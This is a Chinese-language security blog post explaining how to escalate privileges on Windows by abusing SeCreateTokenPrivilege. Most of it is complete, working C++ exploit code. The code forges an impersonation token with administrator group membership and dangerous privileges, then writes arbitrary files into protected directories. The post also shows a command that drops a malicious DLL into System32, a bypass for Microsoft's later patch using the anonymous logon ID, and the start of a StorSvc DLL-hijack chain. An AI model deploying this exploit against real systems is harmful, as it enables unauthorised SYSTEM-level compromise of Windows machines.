---
title: Creating Windows Access Tokens With God Privilege
date: 2023-07-06 17:57:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Windows Privileges", "Privilege Escalation"]
layout: post
---

# SeCreateTokenPrivilege

在 Windows 系统中，存在一个名为 SeCreateTokenPrivilege 的特权，它在 Microsoft 官方文档中被描述为 “*Create a token object*”。它被认为是 “上帝” 权限，因为拥有该特权的任何进程能够通过 ZwCreateToken API 创建主令牌，该函数是 Windows 操作系统的 Native API，其语法如下。

```c++
NTSTATUS ZwCreateToken(
	OUT PHANDLE TokenHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN TOKEN_TYPE Type,
	IN PLUID AuthenticationId,
	IN PLARGE_INTEGER ExpirationTime,
	IN PTOKEN_USER User,
	IN PTOKEN_GROUPS Groups,
	IN PTOKEN_PRIVILEGES Privileges,
	IN PTOKEN_OWNER Owner,
	IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
	IN PTOKEN_DEFAULT_DACL DefaultDacl,
	IN PTOKEN_SOURCE Source
);
```

- TokenHandle：用于接收创建的访问令牌的句柄。
- DesiredAccess：访问令牌的所需访问权限，使用 `TOKEN_ALL_ACCESS` 可以获得所有权限。
- ObjectAttributes：指向 `OBJECT_ATTRIBUTES` 结构的指针，用于指定令牌对象的属性。
- Type：指定要创建的令牌的类型，如  TokenPrimary 或 TokenImpersonation。
- AuthenticationId：指定令牌的身份验证标识。
- ExpirationTime：指定令牌的过期时间，或使用 `NULL` 表示不设置过期时间。
- User：指向 `TOKEN_USER` 结构的指针，用于指定令牌所属的用户。
- Groups：指向 `TOKEN_GROUPS` 结构的指针，用于指定令牌所属的组。
- Privileges：指向 `TOKEN_PRIVILEGES` 结构的指针，用于指定令牌的特权。
- Owner：指向 `TOKEN_OWNER` 结构的指针，用于指定令牌的所有者。
- PrimaryGroup：指向 `TOKEN_PRIMARY_GROUP` 结构的指针，用于指定令牌的主组。
- DefaultDacl：指向 `TOKEN_DEFAULT_DACL` 结构的指针，用于指定令牌的默认 DACL。
- Source：指向 `TOKEN_SOURCE` 结构的指针，用于指定令牌的源标识。

如果我们接管了拥有 SeCreateTokenPrivilege 特权的账户或进程，就可以通过 `ZwCreateToken()` 函数制作一个新的模拟令牌并添加特权组的 SID，实现特权提升。

如前所述，我们希望在令牌上启用本地管理员组。为此，我们使用本地管理员组的 RID 构建一个 SID：

```c++
// S-1-5-32-544
SID_BUILTIN LocalAdminGroupSID = { 1, 2,{ 0, 0, 0, 0, 0, 5 },{ 32,                                                DOMAIN_ALIAS_RID_ADMINS } };
```

然后我们遍历令牌的组并将其从当前用户提升为管理员：

```c++
for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
{
	pSid = (PISID)pTokenGroups->Groups[i].Sid;
  	if (pSid->SubAuthority[pSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
  	{
    	memcpy(pSid, &LocalAdminGroupSID, sizeof(LocalAdminGroupSID));
    	pTokenGroups->Groups[i].Attributes = SE_GROUP_ENABLED;
    	wprintf(L"[*] Add extra SID S-1-5-32-544 to token.\n");
  	}
}
```

最后的更改是确保我们正在构建 TokenImpersonation 模拟级别的令牌，这可以在令牌的对象属性中设置：

```c++
SECURITY_QUALITY_OF_SERVICE securityQualityOfService = { sizeof(securityQualityOfService),
                                                         SecurityImpersonation, 
                                                         SECURITY_STATIC_TRACKING, FALSE };
OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes), 0, 0, 0, 0, &securityQualityOfService };
```

目前只剩下最后一个难题，就是我们将如何使用生成的模拟令牌，因为我们假设我们只拥有 SeCreateTokenPrivilege 特权，没有其他与模拟相关的特权（例如 SeImpersonatePrivilege）。我们回顾 Windows 有关令牌模拟的相关规则：

> - IF the token level < Impersonate THEN allow (such tokens are called “Identification” level and can not be used for privileged actions).  
> - IF the process has “Impersonate” privilege THEN allow.  
> - IF the process integrity level >= the token integrity level AND the process user == token user THEN allow ELSE restrict the token to “Identification” level (no privileged actions possible).

我们关注最后一条规则 “*IF the process integrity level >= the token integrity level AND the process user == token user THEN allow ELSE restrict the token to “Identification” level (no privileged actions possible)*”，也就是说，只要令牌是给我们当前用户的，并且完整性级别小于或等于当前进程完整性级别，我们就应该能够在没有任何特殊权限的情况下模拟令牌。令牌的完整性级别可以在构造令牌时设置。我们只需将完整性级别设置为 “Medium”，然后调用 `SetThreadToken()` 函数将当前线程的令牌替换为新令牌即可。

如下图所示，本地用户 John 拥有 SeCreateTokenPrivilege 特权。

![image-20230706124651014](/assets/posts/2023-07-06-creating-windows-access-tokens-with-god-privilege/image-20230706124651014.png)

我们可以通过 `ZwCreateToken()` 函数创建一个提升权限的模拟令牌，使用该令牌创建线程实现任意文件写入，最终通过 DLL 劫持等方法实现提权。下面给出可供参考的利用代码。
# Implemented By C/C++
## Main Fcuntion

主函数首先从命令行获取 `-s` 和 `-d` 两个参数，分别对应后续文件写入的源文件和目的文件，然后通过 `GetCurrentProcess()` 和 `OpenProcessToken()` 函数打开当前进程的句柄，如下所示。

```c++
int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	HANDLE pElevatedToken = NULL;
	HANDLE hThread = NULL;
	LPCWSTR sourceFile = NULL;
	LPCWSTR destFile = NULL;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 's':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				sourceFile = (LPCWSTR)argv[1];
			}
			break;
		case 'd':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				destFile = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}

	// Enable SeCreateTokenPrivilege for the current process token.
	if (!EnableTokenPrivilege(hToken, SE_CREATE_TOKEN_NAME))
	{
		wprintf(L"[-] Failed to enable SeCreateTokenPrivilege for the current process token.\n");
		return 0;
	}

	pElevatedToken = CreateUserToken(hToken);
	if (pElevatedToken == NULL)
	{
		wprintf(L"[-] Failed to create user token.\n");
		return 0;
	}

	if (!DisplayTokenInformation(pElevatedToken))
	{
		wprintf(L"[-] Failed to get S4U token information.\n");
		return 0;
	}

	hThread = GetCurrentThread();

	if (!SetThreadToken(&hThread, pElevatedToken))
	{
		wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
		return 0;
	}
	wprintf(L"\n[*] Successfully impersonated the elevated token.\n");

	if (!ExploitSeCreateTokenPrivilege(sourceFile, destFile))
	{
		wprintf(L"[-] Failed to exploit SeCreateTokenPrivilege.\n");
		return 0;
	}
}
```

然后调用 `EnableTokenPrivilege()` 函数，该函数通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeCreateTokenPrivilege 特权，如下所示。

```c++
BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}
```

接着，凭借已开启的 SeCreateTokenPrivilege 特权，调用 `CreateUserToken()` 函数创建新令牌。

## Create User Token

`CreateUserToken()` 函数的定义如下。

```c++
HANDLE CreateUserToken(HANDLE hToken)
{
	NTSTATUS Status;
	HANDLE pElevatedToken = NULL;
	PTOKEN_USER pTokenUser = NULL;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	PTOKEN_GROUPS pTokenGroups = NULL;
	PTOKEN_PRIMARY_GROUP pTokenPrimaryGroup = NULL;
	PTOKEN_DEFAULT_DACL pTokenDefaultDacl = NULL;
	TOKEN_SOURCE tokenSource;
	PTOKEN_OWNER pTokenOwner = NULL;
	SECURITY_QUALITY_OF_SERVICE securityQualityOfService = { sizeof(securityQualityOfService), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
	OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes), 0, 0, 0, 0, &securityQualityOfService };
	LUID AuthenticationId = SYSTEM_LUID;
	LARGE_INTEGER ExpirationTime;

	_ZwCreateToken ZwCreateToken;

	PISID pSid = NULL;
	SID_BUILTIN LocalAdminGroupSID = { 1, 2,{ 0, 0, 0, 0, 0, 5 },{ 32, DOMAIN_ALIAS_RID_ADMINS } };
	SID_INTEGRITY IntegrityMediumSID = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };

	HANDLE hThread = NULL;

	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
	if (ZwCreateToken == NULL) {
		printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
		return NULL;
	}
	wprintf(L"[*] ZwCreateToken function loaded.\n");
	pTokenUser = (PTOKEN_USER)GetTokenInfo(hToken, TokenUser);

	strcpy_s(tokenSource.SourceName, TOKEN_SOURCE_LENGTH, "User32");
	AllocateLocallyUniqueId(&tokenSource.SourceIdentifier);

	pTokenPrivileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 4));
	pTokenPrivileges = (PTOKEN_PRIVILEGES)GetTokenInfo(hToken, TokenPrivileges);
	SetTokenPrivileges(pTokenPrivileges);
	pTokenGroups = (PTOKEN_GROUPS)GetTokenInfo(hToken, TokenGroups);
	pTokenPrimaryGroup = (PTOKEN_PRIMARY_GROUP)GetTokenInfo(hToken, TokenPrimaryGroup);
	pTokenDefaultDacl = (PTOKEN_DEFAULT_DACL)GetTokenInfo(hToken, TokenDefaultDacl);

	for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
	{
		if (pTokenGroups->Groups[i].Attributes & SE_GROUP_INTEGRITY)
		{
			memcpy(pTokenGroups->Groups[i].Sid, &IntegrityMediumSID, sizeof(IntegrityMediumSID));
			wprintf(L"[*] Set the token integrity level to medium.\n");
		}

		pSid = (PISID)pTokenGroups->Groups[i].Sid;
		if (pSid->SubAuthority[pSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
		{
			memcpy(pSid, &LocalAdminGroupSID, sizeof(LocalAdminGroupSID));
			pTokenGroups->Groups[i].Attributes = SE_GROUP_ENABLED;
			wprintf(L"[*] Add extra SID S-1-5-32-544 to token.\n");
		}
		else
		{
			pTokenGroups->Groups[i].Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pTokenGroups->Groups[i].Attributes &= ~SE_GROUP_ENABLED;
		}
	}

	pTokenOwner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
	pTokenOwner->Owner = pTokenUser->User.Sid;

	ExpirationTime.HighPart = 0xFFFFFFFF;
	ExpirationTime.LowPart = 0xFFFFFFFF;

	Status = ZwCreateToken(
		&pElevatedToken,
		TOKEN_ALL_ACCESS,
		&objectAttributes,
		TokenImpersonation,
		&AuthenticationId,
		&ExpirationTime,
		pTokenUser,
		pTokenGroups,
		pTokenPrivileges,
		pTokenOwner,
		pTokenPrimaryGroup,
		pTokenDefaultDacl,
		&tokenSource
	);
	if (Status != STATUS_SUCCESS)
	{
		wprintf(L"[-] ZwCreateToken Error: [0x%x].\n", Status);
		goto Clear;
	}
	wprintf(L"[*] ZwCreateToken successfully and get elevated token:\n\n");

	goto Clear;

Clear:
	if (pTokenPrivileges)
		LocalFree(pTokenPrivileges);
	if (pTokenOwner)
		LocalFree(pTokenOwner);
	if (hToken)
		CloseHandle(hToken);

	return pElevatedToken;
}
```

在 `CreateUserToken()` 函数内部，首先定义了新令牌对象的属性，以保证最终生成的令牌的模拟级别为 SecurityImpersonation：

```c++
SECURITY_QUALITY_OF_SERVICE securityQualityOfService = { sizeof(securityQualityOfService), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes), 0, 0, 0, 0, &securityQualityOfService };
```

然后定义了两个 SID，分别代表本地管理员组的 SID，和 Medium 完整想等级等级的 SID：

```c++
SID_BUILTIN LocalAdminGroupSID = { 1, 2,{ 0, 0, 0, 0, 0, 5 },{ 32, DOMAIN_ALIAS_RID_ADMINS } };
SID_INTEGRITY IntegrityMediumSID = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };
```

接着通过 `GetProcAddress()` API 将 `ZwCreateToken()` 函数从 ntdll.dll 模块中加载进来，需要预先定义 ZwCreateToken 类型：

```c++
// ...
typedef NTSYSAPI NTSTATUS(NTAPI* _ZwCreateToken)(
	OUT PHANDLE TokenHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN TOKEN_TYPE Type,
	IN PLUID AuthenticationId,
	IN PLARGE_INTEGER ExpirationTime,
	IN PTOKEN_USER User,
	IN PTOKEN_GROUPS Groups,
	IN PTOKEN_PRIVILEGES Privileges,
	IN PTOKEN_OWNER Owner,
	IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
	IN PTOKEN_DEFAULT_DACL DefaultDacl,
	IN PTOKEN_SOURCE Source
);
// ...
_ZwCreateToken ZwCreateToken;
// ...
ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
if (ZwCreateToken == NULL) {
	printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
	return NULL;
}
wprintf(L"[*] ZwCreateToken function loaded.\n");
```

由于要创建一个新的令牌，因此必须向 `ZwCreateToken()` 函数提供令牌的 TokenPrivileges、TokenGroups、TokenPrimaryGroup 和 TokenDefaultDacl 等信息。我们不需要自己构造这些信息，只需要从当前进程令牌中获取，最后将这些进行传入 `ZwCreateToken()` 函数。在此之前，需要在获取到的 TokenGroups 信息中设置 LocalAdminGroupSID 和 IntegrityMediumSID 两个 SID，以保证新生成的令牌拥有本地管理员权限并且完整性等级为 Medium。

```c++
pTokenPrivileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 4));
pTokenPrivileges = (PTOKEN_PRIVILEGES)GetTokenInfo(hToken, TokenPrivileges);
SetTokenPrivileges(pTokenPrivileges);
pTokenGroups = (PTOKEN_GROUPS)GetTokenInfo(hToken, TokenGroups);
pTokenPrimaryGroup = (PTOKEN_PRIMARY_GROUP)GetTokenInfo(hToken, TokenPrimaryGroup);
pTokenDefaultDacl = (PTOKEN_DEFAULT_DACL)GetTokenInfo(hToken, TokenDefaultDacl);

for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
{
	if (pTokenGroups->Groups[i].Attributes & SE_GROUP_INTEGRITY)
  	{
    	memcpy(pTokenGroups->Groups[i].Sid, &IntegrityMediumSID, sizeof(IntegrityMediumSID));
    	wprintf(L"[*] Set the token integrity level to medium.\n");
  	}

  	pSid = (PISID)pTokenGroups->Groups[i].Sid;
  	if (pSid->SubAuthority[pSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
  	{
    	memcpy(pSid, &LocalAdminGroupSID, sizeof(LocalAdminGroupSID));
    	pTokenGroups->Groups[i].Attributes = SE_GROUP_ENABLED;
    	wprintf(L"[*] Add extra SID S-1-5-32-544 to token.\n");
  	}
  	else
  	{
        pTokenGroups->Groups[i].Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
        pTokenGroups->Groups[i].Attributes &= ~SE_GROUP_ENABLED;
  	}
}
```

于此同时，我们当然可以为新生成的令牌开启一些新的危险特权。如下所示，`SetTokenPrivileges()` 函数在令牌的 TokenPrivileges 信息中启用了以下六个特权，他们都可以被滥用以实现特权提升。

- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege
- SeCreateTokenPrivilege
- SeRestorePrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

```c++
void SetTokenPrivileges(PTOKEN_PRIVILEGES pTokenPrivileges)
{
	LUID luid;

	pTokenPrivileges->PrivilegeCount = 6;

	// Enable SeImpersonatePrivilege
	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
	pTokenPrivileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[0].Luid = luid;

	// Enable SeAssignPrimaryTokenPrivilege
	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
	pTokenPrivileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[1].Luid = luid;

	// Enable SeCreateTokenPrivilege
	LookupPrivilegeValue(NULL, SE_CREATE_TOKEN_NAME, &luid);
	pTokenPrivileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[2].Luid = luid;

	// Enable SeRestorePrivilege
	LookupPrivilegeValue(NULL, SE_RESTORE_NAME, &luid);
	pTokenPrivileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[3].Luid = luid;

	// Enable SeTakeOwnershipPrivilege
	LookupPrivilegeValue(NULL, SE_TAKE_OWNERSHIP_NAME, &luid);
	pTokenPrivileges->Privileges[4].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[4].Luid = luid;

	// Enable SeDebugPrivilege
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	pTokenPrivileges->Privileges[5].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[5].Luid = luid;
}
```

为了能够成功模拟新生成的令牌，还有最后重要的一点，就是将令牌的拥有者设为当前用户。这里也是先查询当前进程令牌的 TokenUser 信息，该信息与访问令牌关联的用户的 SID，我们只需要将这个 SID 设置到 `ZwCreateToken()` 函数的 `Owner` 参数中即可：

```
pTokenUser = (PTOKEN_USER)GetTokenInfo(hToken, TokenUser);
// ...
pTokenOwner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
pTokenOwner->Owner = pTokenUser->User.Sid;
```

最后将调用 `ZwCreateToken()` 函数来生成模拟令牌，生成的令牌被保存在 `pElevatedToken` 指针所指向的内存中：

```c++
Status = ZwCreateToken(
	&pElevatedToken,
	TOKEN_ALL_ACCESS,
    &objectAttributes,
    TokenImpersonation,
    &AuthenticationId,
    &ExpirationTime,
    pTokenUser,
    pTokenGroups,
    pTokenPrivileges,
    pTokenOwner,
    pTokenPrimaryGroup,
    pTokenDefaultDacl,
    &tokenSource
);
if (Status != STATUS_SUCCESS)
{
	wprintf(L"[-] ZwCreateToken Error: [0x%x].\n", Status);
    goto Clear;
}
wprintf(L"[*] ZwCreateToken successfully and get elevated token:\n\n");
```

## Display Token Information

如果没有什么问题，`CreateUserToken()` 会将新令牌返回到主函数，并传递给 `DisplayTokenInformation()` 函数获取并打印令牌的 TokenStatistics、TokenGroups、TokenIntegrityLevel 和 TokenPrivileges 信息，如下所示。

```c++
BOOL DisplayTokenInformation(HANDLE hToken)
{
	BOOL status = FALSE;
	DWORD dwLength = 0;
	PTOKEN_STATISTICS pTokenStatistics = NULL;
	PTOKEN_GROUPS pTokenGroups = NULL;
	DWORD dwNameSize;
	DWORD dwDomainSize;
	LPWSTR lpGroupName = NULL;
	LPWSTR lpDomainName = NULL;
	LPWSTR lpGroupAccountName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
	SID_NAME_USE peUse;

	PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
	PSID pSid;
	LPWSTR lpGroupSid;
	LPWSTR lpIntegritySid;
	UINT len = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	LPWSTR lpName = NULL;
	LPWSTR lpAttrbutes = (LPWSTR)LocalAlloc(LPTR, 8 * sizeof(WCHAR));

	// Get Token Statistics Information
	pTokenStatistics = (PTOKEN_STATISTICS)GetTokenInfo(hToken, TokenStatistics);
	if (pTokenStatistics != NULL)
	{
		wprintf(L" > Token Statistics Information: \n");
		wprintf(L"	 Token Id            : %u:%u (%08x:%08x)\n", pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart, pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart);
		wprintf(L"	 Authentication Id   : %u:%u (%08x:%08x)\n", pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart, pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart);
		wprintf(L"	 Token Type          : %d\n", pTokenStatistics->TokenType);
		wprintf(L"	 Impersonation Level : %d\n", pTokenStatistics->ImpersonationLevel);
		wprintf(L"	 Group Count         : %d\n", pTokenStatistics->GroupCount);
		wprintf(L"	 Privilege Count     : %d\n\n", pTokenStatistics->PrivilegeCount);

		status = TRUE;
	}

	pTokenGroups = (PTOKEN_GROUPS)GetTokenInfo(hToken, TokenGroups);
	if (pTokenGroups != NULL)
	{
		wprintf(L" > Token Group Information: \n");
		for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
		{
			if (!(pTokenGroups->Groups[i].Attributes & SE_GROUP_LOGON_ID))
			{
				pSid = pTokenGroups->Groups[i].Sid;
				dwNameSize = MAX_PATH;
				dwDomainSize = MAX_PATH;
				lpGroupName = (LPWSTR)LocalAlloc(LPTR, dwNameSize * sizeof(WCHAR));
				lpDomainName = (LPWSTR)LocalAlloc(LPTR, dwDomainSize * sizeof(WCHAR));
				if (!LookupAccountSidW(NULL, pSid, lpGroupName, &dwNameSize, lpDomainName, &dwDomainSize, &peUse))
				{
					wprintf(L"[-] LookupAccountSidW Error: [%u].\n", GetLastError());
					goto Clear;
				}

				if (!ConvertSidToStringSidW(pSid, &lpGroupSid)) {
					wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
					goto Clear;
				}

				len = wsprintf(lpGroupAccountName, TEXT("%ws%ws%ws"), lpDomainName, dwDomainSize != 0 ? L"\\" : L"", lpGroupName);
				wprintf(L"	 %-50ws%ws\n", lpGroupAccountName, lpGroupSid);
				dwNameSize = MAX_PATH;
				dwDomainSize = MAX_PATH;
			}
			
		}

		status = TRUE;
	}

	pTokenIntegrityLevel = (PTOKEN_MANDATORY_LABEL)GetTokenInfo(hToken, TokenIntegrityLevel);
	if (pTokenIntegrityLevel != NULL)
	{
		wprintf(L"\n > Token Integrity Level: \n");
		pSid = pTokenIntegrityLevel->Label.Sid;
		if (!ConvertSidToStringSidW(pSid, &lpIntegritySid)) {
			wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
			goto Clear;
		}
		wprintf(L"	 %ws\n", lpIntegritySid);

		status = TRUE;
	}

	pTokenPrivileges = (PTOKEN_PRIVILEGES)GetTokenInfo(hToken, TokenPrivileges);

	wprintf(L"\n > Token Privileges Information: \n");
	dwLength = MAX_PATH;
	for (int i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
	{
		lpName = (LPWSTR)LocalAlloc(LPTR, dwLength * sizeof(WCHAR));
		if (!(status = LookupPrivilegeNameW(NULL, &pTokenPrivileges->Privileges[i].Luid, lpName, &dwLength)))
		{
			wprintf(L"[-] LookupPrivilegeNameW Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"	 %-50ws", lpName);
		if (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
			len += wsprintf(lpAttrbutes, TEXT("Enabled"));
		if (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
			len += wsprintf(lpAttrbutes, TEXT("Enabled"));
		if (lpAttrbutes[0] == 0)
			wsprintf(lpAttrbutes, TEXT("Disabled"));
		wprintf(L"%ws\n", lpAttrbutes);
		dwLength = MAX_PATH;
	}

Clear:
	if (pTokenStatistics != NULL)
		LocalFree(pTokenStatistics);
	if (pTokenGroups != NULL)
		LocalFree(pTokenGroups);

	return status;
}
```

## Impersonate The Elevated Token

接着，会调用 `SetThreadToken()` 函数将当前线程的令牌替换为新生成的令牌，如下所示。

```c++
hThread = GetCurrentThread();

if (!SetThreadToken(&hThread, pElevatedToken))
{
	wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
	return 0;
}
wprintf(L"\n[*] Successfully impersonated the elevated token.\n");
```

到这里，我们就已经获取了本地管理员权限了，写入受保护目录、并写入/覆盖注册表项等特权操作都是轻而易举。

## Write To Protected Directory

在我的 POC 中，我编写了 `ExploitSeCreateTokenPrivilege()` 函数，用于将指定文件写入受保护目录，如下所示。

```c++
BOOL ExploitSeCreateTokenPrivilege(LPCWSTR sourceFile, LPCWSTR destFile)
{
	BOOL status = FALSE;
	HANDLE hSource, hDestination;
	char buffer[SIZE + 1];
	DWORD dwBytesRead, dwBytesWrite;

	if (sourceFile && destFile)
	{
		// Open source file.
		hSource = CreateFileW(sourceFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hSource == INVALID_HANDLE_VALUE)
		{
			wprintf(L"[-] Could not open source file by CreateFileW: [%u].\n", GetLastError());
			return status;
		}
		// Create destination file.
		hDestination = CreateFileW(destFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDestination == INVALID_HANDLE_VALUE)
		{
			wprintf(L"[-] Could not create destination file by CreateFileW: [%u].\n", GetLastError());
			return status;
		}
		// Read from source file.
		if (!ReadFile(hSource, buffer, SIZE, &dwBytesRead, NULL))
		{
			wprintf(L"[-] ReadFile Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Read bytes from %ws: %d\n", sourceFile, dwBytesRead);
		// Write to destination file.
		if (!WriteFile(hDestination, buffer, dwBytesRead, &dwBytesWrite, NULL))
		{
			wprintf(L"[-] WriteFile Error: [%u].\n", GetLastError());
			return status;
		}
		printf("[*] Bytes written to %ws: %d\n", destFile, dwBytesWrite);
		status = TRUE;
	}
}
```

你可以在这里找到我完整的 POC 代码：[ExploitSeCreateTokenPrivilege.cpp](https://gist.github.com/wh0amitz/62b1522609c77ab06a393fc756d62316)

# Let’s see it in action

编译上述 POC，上传到目标主机，在拥有 SeCreateTokenPrivilege 特权的账户下执行以下命令，即可向 C:\Windows\System32\ 目录中写入一个恶意 DLL 文件，如下图所示。

```console
SeCreateTokenPrivilege.exe -s malicious.dll -d C:\Windows\System32\malicious.dll
```

![image-20230706134621994](/assets/posts/2023-07-06-creating-windows-access-tokens-with-god-privilege/image-20230706134621994.png)

![image-20230706135025054](/assets/posts/2023-07-06-creating-windows-access-tokens-with-god-privilege/image-20230706135025054.png)

## ANONYMOUS_LOGON_LUID

不幸的是，以上测试是在 Windows 10 1803 系统上执行的，它在 Windows 10 >= 1809 或 Windows Server 2019 服务器上并不起作用......如下图所示，会报 [1346] 错误：“*Either a required impersonation level was not provided, or the provided impersonation level is invalid.*”。

![image-20230706143053564](/assets/posts/2023-07-06-creating-windows-access-tokens-with-god-privilege/image-20230706143053564.png)

这是由于在安装了 *KB4507459* 补丁之后，微软添加了一些补充检查。我们生成的令牌被认为是 “特权” 的，因为它具有 “上帝” 特权和强大的组成员身份，因此新的附加控件将由于缺乏授予调用进程的特定模拟特权而将令牌的模拟级别被自动降级为 SecurityIdentification，该级别的令牌服务器不能模拟客户端。

但永远不要放弃！还记得 `ZwCreateToken()` 函数中的 AuthenticationId 吗？在之前，它被设置为 SYSTEM_LUID（0x3e7），也就是 SYSTEM 帐户的登录会话 ID。现在，让我们尝试更改它并为其分配 ANONYMOUS_LOGON_LUID（0x3e6），如下所示，也许这一项被认为是无害的，但是所有后续检查都被跳过。

```c++
HANDLE CreateUserToken(HANDLE hToken)
{
	// ...
	LUID AuthenticationId = ANONYMOUS_LOGON_LUID;
	// ...
	Status = ZwCreateToken(
		&pElevatedToken,
		// ...
		&AuthenticationId,
		// ...
	);
	// ...
}
```

如下图所示，我们成功在最新的 Windows 版本（Windows Server 2022 21H2 20348.1726）上利用 SeCreateTokenPrivilege 实现任意文件写入。

![image-20230706144410386](/assets/posts/2023-07-06-creating-windows-access-tokens-with-god-privilege/image-20230706144410386.png)

## Local Privilege Escalation via StorSvc

在实际利用中，我们可以通过存在缺陷的服务，利用 DLL 劫持实现本地特权提升。Windows 的 StorSvc 是一项以 NT AUTHORITY\SYSTEM 账户权限运行的服务，为存储设置和外部存储扩展提供启用服务。该服务在本地调用 SvcRebootToFlashingMode RPC 方法时，最终会尝试加载缺少的 SprintCSP.dll DLL，如下图所示。

`StorSvc.dll!SvcRebootToFlashingMode()` 方法会调用 `StorSvc.dll!InitResetPhone()` 方法：

![image-20230706150931578](/assets/posts/2023-07-06-creating-windows-access-tokens-with-god-privilege/image-20230706150931578.png)

